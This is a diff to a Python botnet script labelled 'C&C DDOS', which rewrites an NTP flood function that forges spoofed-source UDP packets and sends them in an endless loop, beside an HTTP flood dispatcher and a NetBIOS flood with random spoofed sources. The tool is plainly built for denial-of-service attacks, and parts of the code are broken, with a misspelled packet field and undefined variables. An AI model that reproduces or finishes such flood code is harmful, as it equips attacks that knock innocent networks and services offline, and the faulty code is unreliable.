@@ -1,7 +1,7 @@
 """
 ==================================================
  C&C DDOS By KyaEH, Getwod, Luks, Neowi, 3RW4NFR
- V0.0.3
+ V0.0.2
  Repo: https://github.com/kyaEH/C-CDDOS/
 ==================================================
 """
@@ -73,7 +73,7 @@ def askOrder():
 			httpFlood(cible[0],cible[1])
 
 		if cible[1]==123:
-			ntpFlood(cible[0])
+			ntpFlood(cible[0],cible[1])
 
 		if cible[1]==137:
 			netbiosFlood(cible[0])
@@ -149,11 +149,14 @@ def httpFlood(cible,port):
 		time.sleep(15)
 
 def ntpFlood(cible, source):
+	hostname = socket.gethostname()
+	target = socket.gethostbyname(hostname)
+	nameserver = ip
+	domain=""
 
-    pkt = IP(dsc=cible, src=source)/UDP(sport=random.randint(1000, 65535),dport=123)/Raw(load=data)
-    send(pkt,loop=1)
-    print("NTP Flood sur {}".format(cible))
-    
+	pkt = IP(dsc=target, src=nameserver)/UDP(sport=random.randint(1000, 65535),dport=port)/Raw(load=data)
+	send(pkt,loop=1)
+
 def netbiosFlood(cible):
 	ip = IP(src=RandIP("192.168.1.1/24"), dst=addr)
 	# forge a UDP packet 
